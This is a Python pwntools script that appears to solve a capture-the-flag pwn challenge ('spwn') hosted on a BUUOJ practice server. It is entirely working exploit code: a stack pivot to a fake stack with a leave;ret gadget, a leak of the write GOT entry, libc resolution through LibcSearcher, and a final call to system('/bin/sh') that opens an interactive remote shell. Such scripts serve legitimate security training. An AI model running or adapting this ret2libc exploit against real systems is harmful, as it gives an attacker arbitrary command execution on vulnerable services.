from pwn import *
from LibcSearcher import *

fake_stack = 0x804A300
main_addr = 0x8048513
leave_ret = 0x8048511
write_plt = 0x8048380
write_got = 0x804a01c
r = remote("node3.buuoj.cn", 29406)
# r = process(["../../libc/ld-2.23_86.so", "./spwn"],
# env={"LD_PRELOAD": "../../libc/libc-2.23_86.so"})
context.arch = 'i386'

r.recvuntil("name?")
r.send(flat([fake_stack + 0x200, write_plt, main_addr, 1, write_got, 4]))
r.recvuntil("say?")
r.send('a' * 0x18 + flat([fake_stack, leave_ret]))
write_addr = u32(r.recv(4))
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
bin_sh_addr = libc_base + libc.dump("str_bin_sh")
r.recvuntil("name?")
r.send(flat([fake_stack + 0x200, system_addr, main_addr, bin_sh_addr]))
r.recvuntil("say?")
r.send('a' * 0x18 + flat([fake_stack, leave_ret]))
r.interactive()
